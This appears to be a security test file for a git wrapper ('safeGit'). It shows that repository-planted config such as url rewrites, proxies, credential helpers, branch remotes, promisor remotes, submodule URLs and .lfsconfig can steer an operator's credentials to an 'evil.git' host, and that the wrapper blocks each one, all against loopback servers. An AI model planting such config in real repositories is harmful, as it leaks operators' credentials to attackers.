/**
 * T16 review round 2 (MEDIUM 4): operator credentials must not reach a host the repository chose. End to end against
 * loopback servers: a raw-git control shows the credential really is sent, then safeGit is shown to refuse.
 */
import assert from "node:assert/strict";
import { execFile, execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { type Server, createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, test } from "node:test";
import { forgetRemotePinsForTests, safeGit } from "../../src/git/safeGit.ts";

afterEach(() => forgetRemotePinsForTests());

// a throwaway value, built at run time; it only ever travels to a loopback server owned by this test
const TOKEN = `t${Math.random().toString(36).slice(2)}x${Date.now().toString(36)}`;

interface Fake {
  server: Server;
  port: number;
  seen: string[];
}
async function fake(): Promise<Fake> {
  const seen: string[] = [];
  const server = createServer((req, res) => {
    const auth = req.headers.authorization;
    seen.push(
      `${req.method} ${req.url} host=${req.headers.host} auth=${auth ? Buffer.from(auth.split(" ")[1] ?? "", "base64").toString() : "none"} hdr=${req.headers["x-planted"] ?? ""}`,
    );
    if (!auth) {
      res.writeHead(401, { "WWW-Authenticate": 'Basic realm="x"' });
      res.end();
    } else {
      res.writeHead(404);
      res.end();
    }
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  return { server, port: (server.address() as AddressInfo).port, seen };
}

async function lab() {
  const root = mkdtempSync(join(tmpdir(), "safe-git-net-"));
  mkdirSync(join(root, "home"));
  const gl = join(root, "operator.gitconfig");
  writeFileSync(
    gl,
    `[credential]\n\thelper = "!f() { echo username=operator; echo password=${TOKEN}; }; f"\n[user]\n\tname = op\n\temail = op@example.com\n`,
  );
  const env = {
    ...process.env,
    HOME: join(root, "home"),
    GIT_CONFIG_GLOBAL: gl,
    GIT_CONFIG_NOSYSTEM: "1",
    GIT_TERMINAL_PROMPT: "0",
  };
  const sh = (c: string, cwd = root) => execFileSync("bash", ["-c", c], { cwd, env, stdio: "pipe" });
  sh("git init -q -b main repo && cd repo && echo hi > a && git add . && git commit -qm i");
  const A = await fake();
  const B = await fake();
  const prior = { g: process.env.GIT_CONFIG_GLOBAL, n: process.env.GIT_CONFIG_NOSYSTEM };
  process.env.GIT_CONFIG_GLOBAL = gl;
  process.env.GIT_CONFIG_NOSYSTEM = "1";
  return {
    root,
    repo: join(root, "repo"),
    A,
    B,
    sh,
    env,
    close() {
      A.server.close();
      B.server.close();
      if (prior.g === undefined) delete process.env.GIT_CONFIG_GLOBAL;
      else process.env.GIT_CONFIG_GLOBAL = prior.g;
      if (prior.n === undefined) delete process.env.GIT_CONFIG_NOSYSTEM;
      else process.env.GIT_CONFIG_NOSYSTEM = prior.n;
      rmSync(root, { recursive: true, force: true });
    },
  };
}

const gotCredential = (f: Fake) => f.seen.some((s) => s.includes(TOKEN));

test("repository-local url/http/proxy/protocol/lfs keys are not part of the config git sees: nothing reaches the planted host", async () => {
  const l = await lab();
  try {
    const target = `http://example.invalid:80/x.git`;
    const planted: Array<[string, string]> = [
      ["url rewrite", `git config 'url.http://127.0.0.1:${l.B.port}/.insteadOf' 'http://example.invalid/'`],
      ["url pushInsteadOf", `git config 'url.http://127.0.0.1:${l.B.port}/.pushInsteadOf' 'http://example.invalid/'`],
      ["http.proxy", `git config http.proxy http://127.0.0.1:${l.B.port}`],
      ["http.curloptResolve", `git config http.curloptResolve example.invalid:80:127.0.0.1`],
      ["http.extraHeader", `git config http.extraHeader 'X-Planted: 1'`],
      ["remote.proxy", `git config remote.origin.proxy http://127.0.0.1:${l.B.port}`],
      ["http.<url>.sslVerify", `git config 'http.http://example.invalid/.sslVerify' false`],
      ["protocol.allow", `git config protocol.http.allow always`],
      ["lfs.url", `git config lfs.url http://127.0.0.1:${l.B.port}/lfs`],
      ["credential helper", `git config credential.helper '!f() { echo username=x; echo password=planted; }; f'`],
      ["include", `git config include.path ${join(l.root, "included.gitconfig")}`],
    ];
    writeFileSync(
      join(l.root, "included.gitconfig"),
      `[url "http://127.0.0.1:${l.B.port}/"]\n\tinsteadOf = http://example.invalid/\n`,
    );
    const base = join(l.repo, ".git", "config.base");
    l.sh(`cp .git/config ${base}`, l.repo);
    for (const [name, cmd] of planted) {
      l.sh(`cp ${base} .git/config && git remote add origin ${target}`, l.repo);
      l.sh(cmd, l.repo);
      for (const trust of ["operator", "strict"] as const) {
        l.A.seen.length = 0;
        l.B.seen.length = 0;
        forgetRemotePinsForTests();
        const r = await safeGit(["ls-remote", target], { cwd: l.repo, trust, timeoutMs: 20_000 });
        assert.notEqual(r.code, 0, `${name} (${trust}): example.invalid must not resolve`);
        assert.deepEqual([...l.A.seen, ...l.B.seen], [], `${name} (${trust}): the network was touched`);
      }
    }
  } finally {
    l.close();
  }
});

test("control: with the url rewrite planted, raw git DOES send the operator's credential to the planted host", async () => {
  const l = await lab();
  try {
    l.sh(`git config 'url.http://127.0.0.1:${l.B.port}/.insteadOf' 'http://example.invalid/'`, l.repo);
    await new Promise<void>((done) => {
      execFile("git", ["ls-remote", "http://example.invalid/x.git"], { cwd: l.repo, env: l.env, timeout: 20_000 }, () =>
        done(),
      );
    });
    assert.ok(gotCredential(l.B), `control failed: ${l.B.seen.join(" | ")}`);
  } finally {
    l.close();
  }
});

test("remote URLs are pinned: a changed or added remote URL refuses network commands until Pi itself changes it", async () => {
  const l = await lab();
  try {
    l.sh(`git remote add origin http://127.0.0.1:${l.A.port}/org/repo.git`, l.repo);
    // first sight: allowed, and the operator's credential goes to the host Pi first saw
    for (const trust of ["operator", "strict"] as const) {
      forgetRemotePinsForTests();
      l.A.seen.length = 0;
      await safeGit(["ls-remote", "origin"], { cwd: l.repo, trust, timeoutMs: 20_000 });
      if (trust === "operator") assert.ok(gotCredential(l.A), `legit host got the credential: ${l.A.seen.join(" | ")}`);
    }
    forgetRemotePinsForTests();
    await safeGit(["ls-remote", "origin"], { cwd: l.repo, trust: "operator", timeoutMs: 20_000 });
    // the worker repoints origin
    l.sh(`git config remote.origin.url http://127.0.0.1:${l.B.port}/evil.git`, l.repo);
    l.B.seen.length = 0;
    const r = await safeGit(["ls-remote", "origin"], { cwd: l.repo, trust: "operator", timeoutMs: 20_000 });
    assert.equal(r.code, 128);
    assert.match(r.stderr, /remote URLs changed/);
    assert.deepEqual(l.B.seen, [], "nothing reached the planted host");
    // so does adding a pushurl
    l.sh(`git config remote.origin.url http://127.0.0.1:${l.A.port}/org/repo.git`, l.repo);
    const back = await safeGit(["ls-remote", "origin"], { cwd: l.repo, trust: "operator", timeoutMs: 20_000 });
    assert.doesNotMatch(back.stderr, /refused/);
    l.sh(`git config remote.origin.pushurl http://127.0.0.1:${l.B.port}/evil.git`, l.repo);
    const push = await safeGit(["push", "origin", "main"], { cwd: l.repo, trust: "operator", timeoutMs: 20_000 });
    assert.equal(push.code, 128);
    assert.deepEqual(l.B.seen, []);
    // Pi's own change through safeGit re-pins
    const set = await safeGit(["remote", "set-url", "origin", `http://127.0.0.1:${l.A.port}/org/other.git`], {
      cwd: l.repo,
      trust: "operator",
    });
    assert.equal(set.code, 0, set.stderr);
    l.sh("git config --unset remote.origin.pushurl", l.repo);
    const after = await safeGit(["ls-remote", "origin"], { cwd: l.repo, trust: "operator", timeoutMs: 20_000 });
    assert.doesNotMatch(after.stderr, /refused/);
  } finally {
    l.close();
  }
});

test("the operator's own http/url config (global scope) is honoured", async () => {
  const l = await lab();
  try {
    writeFileSync(
      join(l.root, "operator.gitconfig"),
      `${execFileSync("cat", [join(l.root, "operator.gitconfig")]).toString()}[url "http://127.0.0.1:${l.A.port}/"]\n\tinsteadOf = http://example.invalid/\n`,
    );
    l.sh("git remote add origin http://example.invalid/x.git", l.repo);
    l.A.seen.length = 0;
    const r = await safeGit(["ls-remote", "origin"], { cwd: l.repo, trust: "operator", timeoutMs: 20_000 });
    assert.doesNotMatch(r.stderr, /refused/);
    assert.ok(l.A.seen.length > 0, "the operator's rewrite is applied");
  } finally {
    l.close();
  }
});

test("pins are per repository: two repositories with different remotes in one process do not trip each other", async () => {
  const l = await lab();
  try {
    l.sh(`git init -q -b main other && cd other && git remote add origin http://127.0.0.1:${l.B.port}/o.git`);
    l.sh(`git remote add origin http://127.0.0.1:${l.A.port}/a.git`, l.repo);
    forgetRemotePinsForTests();
    const a = await safeGit(["ls-remote", "origin"], { cwd: l.repo, trust: "operator", timeoutMs: 20_000 });
    const b = await safeGit(["ls-remote", "origin"], {
      cwd: join(l.root, "other"),
      trust: "operator",
      timeoutMs: 20_000,
    });
    assert.doesNotMatch(a.stderr, /refused/);
    assert.doesNotMatch(b.stderr, /refused/);
    l.sh(`git remote add upstream http://127.0.0.1:${l.A.port}/u.git`, l.repo);
    const c = await safeGit(["ls-remote", "origin"], { cwd: l.repo, trust: "operator", timeoutMs: 20_000 });
    assert.match(c.stderr, /remote URLs changed/);
  } finally {
    l.close();
  }
});

// ─── HIGH-3: remote selection and lazy fetching must not steer the operator's credential ───────────────────────────

const rawGit = (l: Awaited<ReturnType<typeof lab>>, args: string[], cwd = l.repo): Promise<void> =>
  new Promise((done) => {
    execFile("git", args, { cwd, env: l.env, timeout: 20_000 }, () => done());
  });

test("branch.<b>.remote / pushRemote and remote.pushDefault naming a URL: raw git sends the credential there, safeGit does not", async () => {
  const l = await lab();
  try {
    const evil = `http://127.0.0.1:${l.B.port}/evil.git`;
    const cases: Array<[string, string, string[]]> = [
      [
        "branch.main.remote",
        `git config branch.main.remote ${evil} && git config branch.main.merge refs/heads/main`,
        ["fetch"],
      ],
      [
        "branch.main.remote (pull)",
        `git config branch.main.remote ${evil} && git config branch.main.merge refs/heads/main`,
        ["pull", "--ff-only"],
      ],
      ["branch.main.pushRemote", `git config branch.main.pushRemote ${evil}`, ["-c", "push.default=current", "push"]],
      ["remote.pushDefault", `git config remote.pushDefault ${evil}`, ["-c", "push.default=current", "push"]],
    ];
    const base = join(l.repo, ".git", "config.base");
    l.sh(`git remote add origin http://127.0.0.1:${l.A.port}/org/repo.git && cp .git/config ${base}`, l.repo);
    for (const [name, plant, argv] of cases) {
      l.sh(`cp ${base} .git/config && ${plant}`, l.repo);
      l.B.seen.length = 0;
      await rawGit(l, argv);
      assert.ok(
        gotCredential(l.B),
        `control (${name}): raw git must send the credential to the named URL: ${l.B.seen.join(" | ")}`,
      );
      for (const trust of ["operator", "strict"] as const) {
        forgetRemotePinsForTests();
        l.B.seen.length = 0;
        // the pin is taken from the legitimate state, then the plant is already in place: only the allow-list can stop it
        await safeGit(argv, { cwd: l.repo, trust, timeoutMs: 20_000 });
        assert.deepEqual(l.B.seen, [], `${name} (${trust}): the planted URL was contacted`);
      }
    }
  } finally {
    l.close();
  }
});

test("a promisor remote planted by extensions.partialclone does not lazily fetch a missing object from the attacker's host", async () => {
  const l = await lab();
  try {
    const evil = `http://127.0.0.1:${l.B.port}/evil.git`;
    const sha = l.sh("git hash-object -w --stdin <<< lazy-blob", l.repo).toString().trim();
    l.sh(`rm -f .git/objects/${sha.slice(0, 2)}/${sha.slice(2)}`, l.repo);
    l.sh(
      `git config core.repositoryformatversion 1 && git config extensions.partialclone evil && git config remote.evil.url ${evil} && git config remote.evil.promisor true`,
      l.repo,
    );
    await rawGit(l, ["cat-file", "-p", sha]);
    assert.ok(gotCredential(l.B), `control: raw git lazily fetches from the promisor: ${l.B.seen.join(" | ")}`);
    for (const trust of ["operator", "strict"] as const) {
      l.B.seen.length = 0;
      const r = await safeGit(["cat-file", "-p", sha], { cwd: l.repo, trust, timeoutMs: 20_000 });
      assert.notEqual(r.code, 0);
      assert.deepEqual(l.B.seen, [], `${trust}: the promisor was contacted`);
    }
  } finally {
    l.close();
  }
});

test("submodule URLs from config or .gitmodules, and --recurse-submodules, are not followed", async () => {
  const l = await lab();
  try {
    const evil = `http://127.0.0.1:${l.B.port}/evil.git`;
    l.sh(`git remote add origin http://127.0.0.1:${l.A.port}/org/repo.git`, l.repo);
    l.sh(
      `git update-index --add --cacheinfo 160000,$(git rev-parse HEAD),sub && printf '[submodule "sub"]\\n\\tpath = sub\\n\\turl = ${evil}\\n' > .gitmodules && git config submodule.sub.url ${evil} && git config submodule.sub.active true`,
      l.repo,
    );
    await rawGit(l, ["-c", "protocol.http.allow=always", "submodule", "update", "--init"]);
    assert.ok(
      gotCredential(l.B),
      `control: raw git submodule update contacts the .gitmodules URL: ${l.B.seen.join(" | ")}`,
    );
    for (const argv of [
      ["submodule", "update", "--init"],
      ["fetch", "--recurse-submodules"],
      ["pull", "--recurse-submodules=on-demand"],
      ["submodule", "foreach", "true"],
    ]) {
      l.B.seen.length = 0;
      const r = await safeGit(argv, { cwd: l.repo, trust: "operator", timeoutMs: 20_000 });
      assert.equal(r.code, 128, argv.join(" "));
      assert.match(r.stderr, /refused/);
      assert.deepEqual(l.B.seen, [], argv.join(" "));
    }
    // a plain fetch neither recurses nor reads submodule config
    l.B.seen.length = 0;
    await safeGit(["fetch"], { cwd: l.repo, trust: "operator", timeoutMs: 20_000 });
    assert.deepEqual(l.B.seen, []);
  } finally {
    l.close();
  }
});

test(".lfsconfig in the work tree: `git lfs` is refused, and smudge is switched off for everything else", async () => {
  const l = await lab();
  try {
    const evil = `http://127.0.0.1:${l.B.port}/lfs`;
    l.sh(`git remote add origin http://127.0.0.1:${l.A.port}/org/repo.git`, l.repo);
    writeFileSync(join(l.repo, ".lfsconfig"), `[lfs]\n\turl = ${evil}\n`);
    const r = await safeGit(["lfs", "locks"], { cwd: l.repo, trust: "operator", timeoutMs: 20_000 });
    assert.equal(r.code, 128);
    assert.match(r.stderr, /\.lfsconfig/);
    assert.deepEqual(l.B.seen, []);
    // smudge sees GIT_LFS_SKIP_SMUDGE=1: a stand-in for git-lfs records what it was given
    const probe = join(l.root, "smudge.sh");
    const out = join(l.root, "smudge.out");
    writeFileSync(probe, `#!/bin/sh\necho "skip=$GIT_LFS_SKIP_SMUDGE" >> ${out}\ncat\n`, { mode: 0o755 });
    writeFileSync(
      join(l.root, "operator.gitconfig"),
      `${execFileSync("cat", [join(l.root, "operator.gitconfig")]).toString()}[filter "lfs"]\n\tsmudge = ${probe}\n`,
    );
    writeFileSync(join(l.repo, ".gitattributes"), "*.bin filter=lfs\n");
    writeFileSync(join(l.repo, "x.bin"), "payload\n");
    l.sh("git add -A && git -c filter.lfs.smudge= commit -qm bin && rm x.bin", l.repo);
    const co = await safeGit(["checkout", "--", "x.bin"], { cwd: l.repo, trust: "operator", timeoutMs: 20_000 });
    assert.equal(co.code, 0, co.stderr);
    assert.match(execFileSync("cat", [out]).toString(), /skip=1/);
  } finally {
    l.close();
  }
});

// ─── HIGH-2: the pin ───────────────────────────────────────────────────────────────────────────────────────────────

test("Pi's own reads (remote -v, config --get, remote show -n) do not clear the pin, and a symlinked spelling is the same repository", async () => {
  const l = await lab();
  try {
    l.sh(`git remote add origin http://127.0.0.1:${l.A.port}/org/repo.git`, l.repo);
    const link = join(l.root, "repo-link");
    symlinkSync(l.repo, link);
    const first = await safeGit(["ls-remote", "origin"], { cwd: l.repo, trust: "operator", timeoutMs: 20_000 });
    assert.doesNotMatch(first.stderr, /refused/);
    l.sh(`git config remote.origin.url http://127.0.0.1:${l.B.port}/evil.git`, l.repo);
    for (const argv of [
      ["remote", "-v"],
      ["config", "--get", "remote.origin.url"],
      ["remote", "get-url", "origin"],
      ["remote", "show", "-n", "origin"],
    ]) {
      await safeGit(argv, { cwd: l.repo, trust: "operator", timeoutMs: 20_000 });
    }
    for (const cwd of [l.repo, link]) {
      l.B.seen.length = 0;
      const r = await safeGit(["fetch", "origin"], { cwd, trust: "operator", timeoutMs: 20_000 });
      assert.equal(r.code, 128, cwd);
      assert.match(r.stderr, /remote URLs changed/);
      assert.deepEqual(l.B.seen, []);
    }
  } finally {
    l.close();
  }
});

test("pi.allowedRemote in the operator's global config survives a restart: a repointed remote is refused even on first sight", async () => {
  const l = await lab();
  try {
    writeFileSync(
      join(l.root, "operator.gitconfig"),
      `${execFileSync("cat", [join(l.root, "operator.gitconfig")]).toString()}[pi]\n\tallowedRemote = http://127.0.0.1:${l.A.port}/*\n`,
    );
    l.sh(`git remote add origin http://127.0.0.1:${l.B.port}/evil.git`, l.repo);
    forgetRemotePinsForTests(); // as after a restart: nothing remembered
    const r = await safeGit(["ls-remote", "origin"], { cwd: l.repo, trust: "operator", timeoutMs: 20_000 });
    assert.equal(r.code, 128);
    assert.match(r.stderr, /pi\.allowedRemote/);
    assert.deepEqual(l.B.seen, []);
    // a repository whose URL is on the list works
    l.sh(`git config remote.origin.url http://127.0.0.1:${l.A.port}/org/repo.git`, l.repo);
    forgetRemotePinsForTests();
    const ok = await safeGit(["ls-remote", "origin"], { cwd: l.repo, trust: "operator", timeoutMs: 20_000 });
    assert.doesNotMatch(ok.stderr, /refused/);
    assert.ok(l.A.seen.length > 0);
    // strict mode ignores the operator's global config altogether (and so its list)
  } finally {
    l.close();
  }
});
